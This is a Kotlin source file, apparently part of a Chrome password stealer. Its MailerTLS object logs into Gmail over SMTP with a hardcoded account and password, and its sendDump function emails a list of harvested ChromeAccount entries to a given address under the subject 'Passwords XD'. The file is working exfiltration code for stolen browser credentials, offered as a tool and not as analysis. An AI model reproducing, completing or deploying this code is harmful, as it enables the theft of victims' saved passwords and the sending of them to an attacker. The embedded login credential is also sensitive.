import java.util.*
import javax.mail.*
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage

object MailerTLS {
    private const val emailToUse = "yourgmailaccount@gmail.com" /* Your gmail */
    private const val password = "A51e93A9EkZTAY" /* Your gmail password*/

    private val properties: Properties = Properties().apply {
        this["mail.smtp.auth"] = "true"
        this["mail.smtp.starttls.enable"] = "true"
        this["mail.smtp.host"] = "smtp.gmail.com"
        this["mail.smtp.port"] = "587"
    }

    private val session: Session = Session.getDefaultInstance(properties, object : Authenticator() {
        override fun getPasswordAuthentication(): PasswordAuthentication {
            return PasswordAuthentication(emailToUse, password)
        }
    })

    private fun generatePlainTextEmail(email: String, subject: String, emailBody: String) =
            MimeMessage(session).apply {
                setFrom(InternetAddress(emailToUse))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(email))
                this.subject = subject
                setText(emailBody)
            }

    fun sendDump(email: String, listOfAccounts: List<ChromeAccount>): Boolean = try {
        val body = listOfAccounts.joinToString("\n")
        println(body)
        generatePlainTextEmail(email, "Passwords XD", body).run { Transport.send(this) }

        true
    } catch (e: MessagingException) {
        e.printStackTrace()
        false
    }
}